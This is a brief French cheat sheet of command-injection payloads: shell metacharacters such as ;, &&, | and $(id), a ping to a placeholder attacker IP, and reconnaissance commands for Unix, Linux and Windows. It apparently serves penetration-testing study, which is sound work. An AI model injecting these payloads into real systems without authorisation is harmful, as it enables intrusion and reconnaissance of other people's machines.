Divers métacaractères de shell peuvent être utilisés pour effectuer des attaques par injection de commande

Combin command

```c
;
&
&&
||
|
```

Unix

```sh 
ping -c 10 <attacker-ip>
whoami
#
;
0x0a ou \n # newline
`
$(id)
`id`
```

Linux

```sh
uname -a
ifconfig
netstat -an
ps -ef
```

Windows

```sh
dir
timeout
ver
ipconfig /all
netstat -an
tasklist
```

